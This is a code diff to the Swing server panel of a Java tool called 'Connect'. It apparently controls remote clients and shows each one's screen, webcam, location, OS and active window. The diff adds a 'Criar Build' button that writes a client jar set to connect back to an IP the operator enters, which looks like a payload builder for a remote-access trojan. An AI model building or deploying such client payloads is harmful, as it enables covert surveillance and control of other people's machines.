@@ -4,6 +4,7 @@ package br.com.introcdc.connect.server.gui;
  */
 
 import br.com.introcdc.connect.Connect;
+import br.com.introcdc.connect.client.components.FileComponents;
 import br.com.introcdc.connect.server.ConnectServer;
 import br.com.introcdc.connect.server.components.ServerAudioComponents;
 import br.com.introcdc.connect.server.components.ServerControlComponents;
@@ -61,7 +62,7 @@ public class ServerGUI extends JFrame {
     private final JButton listButton;
     private final JButton helpButton;
     public static JButton controlButton;
-    public static JButton duplicateButton;
+    public static JButton createBuildButton;
     public static JButton fpsButton;
     private final JButton folderButton;
     private final JButton clearButton;
@@ -179,7 +180,7 @@ public class ServerGUI extends JFrame {
         listButton = createButton("Listar");
         helpButton = createButton("Ajuda");
         controlButton = createButton("Controle Remoto");
-        duplicateButton = createButton("Duplicatas");
+        createBuildButton = createButton("Criar Build");
         fpsButton = createButton("FPS (" + ServerImageComponents.FPS + ")");
         folderButton = createButton("Arquivos");
         clearButton = createButton("Limpar");
@@ -215,7 +216,7 @@ public class ServerGUI extends JFrame {
         commandPanel.add(listButton);
         commandPanel.add(helpButton);
         commandPanel.add(controlButton);
-        commandPanel.add(duplicateButton);
+        commandPanel.add(createBuildButton);
         commandPanel.add(fpsButton);
         commandPanel.add(folderButton);
         commandPanel.add(clearButton);
@@ -506,7 +507,7 @@ public class ServerGUI extends JFrame {
 
         String[] columnNames = {
                 "Tela", "Webcam", "Nome", "IP", "Instalação", "Localização",
-                "SO", "Monitores / Webcams", "Ping", "Janela Ativa"
+                "SO", "Mon / Web", "Ping", "Janela Ativa"
         };
 
         clientTableModel = new DefaultTableModel(columnNames, 0) {
@@ -535,10 +536,10 @@ public class ServerGUI extends JFrame {
         clientTable.getColumnModel().getColumn(3).setPreferredWidth(120); // IP
         clientTable.getColumnModel().getColumn(4).setPreferredWidth(140); // Instalação
         clientTable.getColumnModel().getColumn(5).setPreferredWidth(170); // Localização
-        clientTable.getColumnModel().getColumn(6).setPreferredWidth(120); // SO
-        clientTable.getColumnModel().getColumn(7).setPreferredWidth(150); // Monitores / Webcams
-        clientTable.getColumnModel().getColumn(8).setPreferredWidth(80);  // Ping
-        clientTable.getColumnModel().getColumn(9).setPreferredWidth(250); // Janela Ativa
+        clientTable.getColumnModel().getColumn(6).setPreferredWidth(90); // SO
+        clientTable.getColumnModel().getColumn(7).setPreferredWidth(70); // Monitores / Webcams
+        clientTable.getColumnModel().getColumn(8).setPreferredWidth(60);  // Ping
+        clientTable.getColumnModel().getColumn(9).setPreferredWidth(380); // Janela Ativa
 
         if (DARK_MODE) {
             clientTable.setBackground(new Color(69, 73, 74));
@@ -578,7 +579,24 @@ public class ServerGUI extends JFrame {
         listButton.addActionListener(event -> ConnectServer.handleCommand("list"));
         helpButton.addActionListener(event -> ConnectServer.handleCommand("help"));
         controlButton.addActionListener(event -> remoteControlPanel());
-        duplicateButton.addActionListener(event -> ConnectServer.handleCommand("duplicate"));
+        createBuildButton.addActionListener(event -> {
+            String userInput = JOptionPane.showInputDialog(
+                    this, "Escolha o IP", "IP", JOptionPane.PLAIN_MESSAGE);
+            if (userInput != null && !userInput.trim().isEmpty()) {
+                String fileName = FileComponents.getFileName();
+                if (fileName.isEmpty()) {
+                    Connect.saveJar(new File("target/Connect.jar"), userInput.trim());
+                } else {
+                    Connect.saveJar(new File(fileName), userInput.trim());
+                }
+                JOptionPane.showMessageDialog(this, "Build para o ip " + userInput.trim() + " criada!");
+                try {
+                    Desktop.getDesktop().open(new File("connect"));
+                } catch (Exception exception) {
+                    ConnectServer.msg("Ocorreu um erro ao abrir a pasta de recebidos!");
+                }
+            }
+        });
         fpsButton.addActionListener(event -> {
             String userInput = JOptionPane.showInputDialog(
                     this, "Escolha o FPS", "FPS", JOptionPane.PLAIN_MESSAGE);
@@ -606,13 +624,6 @@ public class ServerGUI extends JFrame {
                         ? selectedItem : ConnectServer.CLIENTS.get(Integer.parseInt(selectedItem)).getClientInfo()));
             }
         });
-
-        if (ConnectServer.DISCONNECT_DUPLICATE) {
-            duplicateButton.setBackground(Color.GREEN);
-        } else {
-            duplicateButton.setBackground(Color.RED);
-        }
-        duplicateButton.setForeground(Color.WHITE);
 
         if (ServerControlComponents.CONTROL) {
             controlButton.setBackground(Color.GREEN);
